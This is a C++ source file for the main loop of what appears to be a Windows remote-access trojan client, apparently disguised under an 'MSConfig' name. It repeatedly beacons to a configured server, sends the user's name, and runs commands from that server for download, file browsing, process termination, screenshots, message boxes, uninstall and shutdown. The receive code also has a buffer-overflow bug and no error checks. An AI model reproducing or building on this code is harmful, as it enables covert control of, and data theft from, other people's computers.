#include "MSConfig.h"

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{
    int freq;
    char serverAddr[64], serverPort[64];

    init(freq, serverAddr, serverPort);

    WSADATA wsaData;
    SOCKET ConnectSocket;
    struct addrinfo hints;
    struct addrinfo *result = NULL;
    struct sockaddr_in *serverStr;
    char mcommand[1024], mresponse[128];
    char command[1024], response[1024];
    char username[128];
    int res;
    string totr;
    int waiti;
    waiti = freq * 60000;
    
    
    while (1)
    {
          int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
          Sleep(waiti);
          ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
          if (ConnectSocket == INVALID_SOCKET)
          {
            WSACleanup();
            continue;
          }

		ZeroMemory( &hints, sizeof(hints) );
    	hints.ai_family = AF_UNSPEC;
    	hints.ai_socktype = SOCK_STREAM;
    	hints.ai_protocol = IPPROTO_TCP;
		getaddrinfo(serverAddr,serverPort, &hints, &result);
	      if (result == NULL)
	      {
	        WSACleanup();
	        continue;
	      }
		serverStr = (struct sockaddr_in *) result->ai_addr;
          if ( connect( ConnectSocket, (SOCKADDR*) serverStr, sizeof(*serverStr) ) == SOCKET_ERROR)
          {
               closesocket(ConnectSocket);
               WSACleanup();
               continue;
          }
            totr.clear();
            do
            {
                         res = recv(ConnectSocket, response, 1024, 0);
                         response[res] = '\0';
                         totr += response;
            } while (totr[totr.length() - 1] != '+');
            cout << totr << endl;
            
            GetEnvironmentVariable("USERNAME", username, 128);
            strcpy(command, username);
            strcat(command, "+");
            send(ConnectSocket, command, (int)strlen(command), 0);
            totr.clear();
            do
            {
                         res = recv(ConnectSocket, response, 1024, 0);
                         response[res] = '\0';
                         totr += response;
            } while (totr[totr.length() - 1] != '+');

            switch (totr[0])
            {
                   case 'Q': waiti = 5000;
                             break;
                             
                   case 'Z': disconnect(ConnectSocket, freq);
                             waiti = freq * 60000;
                             break;
                   
                   case 'X': synchronize(ConnectSocket);
                             waiti = 5000;
                             break;
                             
                   case 'D': download(ConnectSocket);
                             waiti = 5000;
                             break;
                   
                   case 'B': browse(ConnectSocket);
                             waiti = 5000;
                             break;
                             
                   case 'T': terminate(ConnectSocket);
                             waiti = 5000;
                             break;
                             
                   case 'F': screenshot(ConnectSocket);
                             waiti = 5000;
                             break;
                             
                   case 'M': messagebox(ConnectSocket);
                             waiti = 5000;
                             break;
                             
                   case 'E': editparams(ConnectSocket);
                             waiti = 5000;
                             break;
                             
                   case 'U': uninstall(ConnectSocket);
                             break;
                             
                   case 'R': shutdown(false, ConnectSocket);
                             break;
                             
                   case 'S': shutdown(true, ConnectSocket);
                             break;
                                         
            }
            
            closesocket(ConnectSocket);
            freeaddrinfo(result);
            WSACleanup();
    }
    
    return 0;
}
